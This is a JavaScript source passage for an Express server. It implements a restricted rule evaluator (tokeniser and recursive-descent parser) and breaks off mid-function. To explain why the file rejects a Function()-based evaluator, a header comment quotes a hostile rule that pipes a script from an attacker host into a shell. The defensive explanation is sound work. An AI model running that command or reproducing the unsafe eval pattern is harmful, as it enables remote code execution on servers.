'use strict';

const express = require('express');
const app = express();
app.use(express.json());

// ---------------------------------------------------------------------------
// Safe rule evaluator
// ---------------------------------------------------------------------------
// The reference implementation in docs/RULES_ENGINE.md proposes:
//
//   Function('ctx', 'req', `return (${expr});`)(ctx.ctx, req)
//
// This executes an arbitrary caller-supplied string as JavaScript, which is a
// critical Remote Code Execution (RCE) vulnerability — any client can send a
// rule such as:
//   "require('child_process').execSync('curl attacker.com | sh')"
// and run unrestricted code inside the server process.
//
// The reference implementation is NOT used here. Instead we provide a
// restricted evaluator that covers all legitimate rule use-cases
// (property access, comparison, arithmetic, logical operators) while
// refusing to evaluate anything that cannot be parsed as a safe expression.
// ---------------------------------------------------------------------------

/**
 * Tokenise a rule string into an array of token objects.
 * Recognised token types:
 *   number   – integer or decimal literal
 *   string   – single- or double-quoted string literal
 *   bool     – true / false
 *   null     – null
 *   ident    – identifier or dotted property path  (e.g. ctx.amount)
 *   op       – operator  (===, !==, ==, !=, <=, >=, &&, ||, !, <, >, +, -, *, /, %)
 *   lparen / rparen
 */
function tokenise(expr) {
  const tokens = [];
  let i = 0;

  while (i < expr.length) {
    // Skip whitespace
    if (/\s/.test(expr[i])) { i++; continue; }

    // String literals
    if (expr[i] === '"' || expr[i] === "'") {
      const quote = expr[i++];
      let str = '';
      while (i < expr.length && expr[i] !== quote) {
        if (expr[i] === '\\') { i++; } // skip escape prefix
        str += expr[i++];
      }
      if (expr[i] !== quote) throw new Error('Unterminated string literal');
      i++; // consume closing quote
      tokens.push({ type: 'string', value: str });
      continue;
    }

    // Numbers
    if (/[0-9]/.test(expr[i]) || (expr[i] === '-' && /[0-9]/.test(expr[i + 1] || ''))) {
      let num = '';
      if (expr[i] === '-') num += expr[i++];
      while (i < expr.length && /[0-9.]/.test(expr[i])) num += expr[i++];
      tokens.push({ type: 'number', value: Number(num) });
      continue;
    }

    // Parentheses
    if (expr[i] === '(') { tokens.push({ type: 'lparen' }); i++; continue; }
    if (expr[i] === ')') { tokens.push({ type: 'rparen' }); i++; continue; }

    // Multi-char operators
    const twoChar = expr.slice(i, i + 2);
    if (['===', '!=='].includes(expr.slice(i, i + 3))) {
      tokens.push({ type: 'op', value: expr.slice(i, i + 3) }); i += 3; continue;
    }
    if (['==', '!=', '<=', '>=', '&&', '||'].includes(twoChar)) {
      tokens.push({ type: 'op', value: twoChar }); i += 2; continue;
    }

    // Single-char operators
    if ('!<>+-*/%'.includes(expr[i])) {
      tokens.push({ type: 'op', value: expr[i] }); i++; continue;
    }

    // Identifiers, keywords, and dotted paths (e.g. ctx.user.age)
    if (/[a-zA-Z_$]/.test(expr[i])) {
      let name = '';
      while (i < expr.length && /[a-zA-Z0-9_$.]/.test(expr[i])) name += expr[i++];
      if (name === 'true')  { tokens.push({ type: 'bool',  value: true  }); continue; }
      if (name === 'false') { tokens.push({ type: 'bool',  value: false }); continue; }
      if (name === 'null')  { tokens.push({ type: 'null',  value: null  }); continue; }
      tokens.push({ type: 'ident', value: name });
      continue;
    }

    throw new Error(`Unexpected character: ${expr[i]}`);
  }
  return tokens;
}

/**
 * Resolve a dotted identifier path against the supplied scope.
 * e.g. resolvePath('ctx.order.amount', { ctx: { order: { amount: 42 } } }) → 42
 */
function resolvePath(path, scope) {
  return path.split('.').reduce((obj, key) => {
    if (obj === undefined || obj === null) return undefined;
    return obj[key];
  }, scope);
}

/**
 * Recursive-descent parser + evaluator.
 * Grammar (lowest → highest precedence):
 *   expr     → or
 *   or       → and  ( '||' and )*
 *   and      → eq   ( '&&' eq  )*
 *   eq       → rel  ( ('==='|'!=='|'=='|'!=') rel )*
 *   rel      → add  ( ('<'|'>'|'<='|'>=')     add )*
 *   add      → mul  ( ('+'|'-')               mul )*
 *   mul      → unary( ('*'|'/'|'%')           unary )*
 *   unary    → '!' unary | primary
 *   primary  → number | string | bool | null | ident | '(' expr ')'
 */
function parse(tokens, scope) {
  let pos = 0;

  function peek() { return tokens[pos]; }
  function consume() { return tokens[pos++]; }

  function parseExpr()  { return parseOr(); }

  function parseOr() {
    let left = parseAnd();
    while (peek() && peek().type === 'op' && peek().value === '||') {
      consume();
      const right = parseAnd();
      left = left || right;
    }
    return left;
  }

  function parseAnd() {
    let left = parseEq();
    while (peek() && peek().type === 'op' && peek().value === '&&') {
      consume();
      const right = parseEq();
      left = left && right;
    }
    return left;
  }

  function parseEq() {
    let left = parseRel();
    while (peek() && peek().type === 'op' && ['===', '!==', '==', '!='].includes(peek().value)) {
      const op = consume().value;
      const right = parseRel();
      if (op === '===' || op === '==') left = left === right;
      else                              left = left !== right;
    }
    return left;
  }

  function parseRel() {
    let left = parseAdd();
    while (peek() && peek().type === 'op' && ['<', '>', '<=', '>='].includes(peek().value)) {
      const op = consume().value;
      const right = parseAdd();
      if (op === '<')  left = left <  right;
      if (op === '>')  left = left >  right;
      if (op === '<=') left = left <= right;
      if (op === '>=') left = left >= right;
    }
    return left;
  }

  function parseAdd() {
    let left = parseMul();
    while (peek() && peek().type === 'op' && ['+', '-'].includes(peek().value)) {
      const op = consume().value;
      const right = parseMul();
      left = op === '+' ? left + right : left - right;
    }
    return left;
  }

  function parseMul() {
    let left = parseUnary();
    while (peek() && peek().type === 'op' && ['*', '/', '%'].includes(peek().value)) {
      const op = consume().value;
      const right = parseUnary();
      if (op === '*') left = left * right;
      if (op === '/') left = left / right;
      if (op === '%') left = left % right;
    }
    return left;
  }

  function parseUnary() {
    if (peek() && peek().type === 'op' && peek().value === '!') {
      consume();
      return !parseUnary();
    }
    return parsePrimary();
  }

  function parsePrimary() {
